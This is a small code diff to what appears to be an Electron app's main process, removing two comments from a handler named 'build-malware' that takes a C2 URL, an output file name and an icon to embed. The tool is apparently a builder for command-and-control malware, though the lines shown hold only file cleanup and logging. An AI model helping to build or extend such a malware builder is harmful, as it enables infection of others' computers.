@@ -4,7 +4,7 @@ const { exec } = require('child_process');
 const fs = require('fs');
 const util = require('util');
 const execPromise = util.promisify(exec);
-const os = require('os'); // Added missing import for os
+const os = require('os'); 
 
 function createWindow() {
   const mainWindow = new BrowserWindow({
@@ -91,7 +91,6 @@ ipcMain.on('build-malware', async (event, { c2Url, outputFileName, iconPath, out
 
     } else {
       console.log('BOFAMET: No icon selected, skipping icon embedding step.');
-      // Если иконка не выбрана, убедимся, что rsrc.syso не остался от предыдущей сборки во временной папке
       if (fs.existsSync(rsrcSysoPathInTemp)) {
         console.log(`BOFAMET: Deleting old rsrc.syso from temporary directory: ${rsrcSysoPathInTemp}`);
         await fs.promises.unlink(rsrcSysoPathInTemp);
